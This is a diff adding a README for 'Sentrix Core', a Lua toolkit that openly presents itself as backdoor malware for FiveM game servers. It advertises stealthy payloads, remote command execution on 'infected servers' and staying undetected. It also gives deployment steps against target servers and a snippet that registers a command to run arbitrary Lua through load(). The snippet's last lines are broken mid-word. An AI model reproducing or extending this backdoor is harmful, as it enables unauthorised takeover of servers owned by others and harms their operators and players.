@@ -1,0 +1,35 @@
+# Sentrix Core
+
+**Real-time control tools for FiveM server environments.**  
+Lightweight, stealth-ready Lua integrations for ultimate server command control.
+
+---
+
+## Features
+
+- Real-time FiveM server monitoring  
+- Secure backdoor payload management  
+- Remote command execution on infected servers  
+- Auto-detection of active backdoor installations  
+- Lightweight and stealthy Lua scripts  
+
+---
+
+## Getting Started
+
+1. Clone or download the repository  
+2. Deploy the backdoor payloads on target FiveM servers  
+3. Use the Sentrix Control Panel (coming soon) to monitor and control servers  
+4. Execute commands remotely and stay undetected
+
+---
+
+## Usage Example
+
+```lua
+-- Sample payload snippet
+RegisterCommand("sentrix_exec", function(source, args)
+    local command = table.concat(args, " ")
+    load(comma
+nd)()
+end)
